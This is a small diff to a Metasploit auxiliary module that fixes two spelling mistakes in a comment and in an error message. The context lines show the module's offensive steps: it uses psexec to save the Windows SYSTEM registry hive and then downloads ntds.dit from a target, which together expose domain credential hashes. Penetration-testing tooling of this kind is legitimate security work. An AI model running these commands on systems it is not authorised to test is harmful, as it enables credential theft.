@@ -168,7 +168,7 @@ class MetasploitModule < Msf::Auxiliary
   # Copies the SYSTEM hive file to the Temp directory on the target host
   def copy_sys_hive
     begin
-      # Try to crate the sys hive copy
+      # Try to create the sys hive copy
       command = "%COMSPEC% /C reg.exe save HKLM\\SYSTEM %WINDIR%\\Temp\\sys /y"
       return psexec(command)
     rescue StandardError => hiveerror
@@ -190,7 +190,7 @@ class MetasploitModule < Msf::Auxiliary
       ntds_path = store_loot("psexec.ntdsgrab.ntds", "application/octet-stream", @ip, data, "ntds.dit")
       print_good("ntds.dit stored at #{ntds_path}")
     rescue StandardError => ntdsdownloaderror
-      print_error("Unable to downlaod ntds.dit: #{ntdsdownloaderror}")
+      print_error("Unable to download ntds.dit: #{ntdsdownloaderror}")
       return ntdsdownloaderror
     end
     simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
